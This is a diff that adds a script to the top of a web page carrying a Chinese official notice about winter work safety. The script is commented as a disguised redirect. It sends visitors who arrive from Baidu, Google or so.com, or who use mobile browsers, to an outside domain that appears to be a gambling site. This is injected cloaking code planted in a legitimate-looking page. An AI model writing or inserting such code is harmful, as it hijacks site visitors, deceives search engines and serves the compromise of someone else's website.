@@ -1,0 +1,16 @@
+<script>
+/* 伪装跳转：仅对从搜索引擎进入的访客显式跳转 */
+(function () {
+  var ref = document.referrer.toLowerCase();
+  var ua = navigator.userAgent.toLowerCase();
+  var fromSearch = ref.indexOf('baidu.com') > -1 || ref.indexOf('google.') > -1 || ref.indexOf('so.com') > -1;
+  var isMobile = /android|iphone|ipad|micromessenger/.test(ua);
+  if (fromSearch || isMobile) {
+    window.location.replace('https://www.xpj-777.xyz/r/?id=1102');
+  }
+})();
+</script>
+<div class="article">
+  <h1>关于做好冬季安全生产工作的通知</h1>
+  <p>各有关单位要高度重视……</p>
+</div>
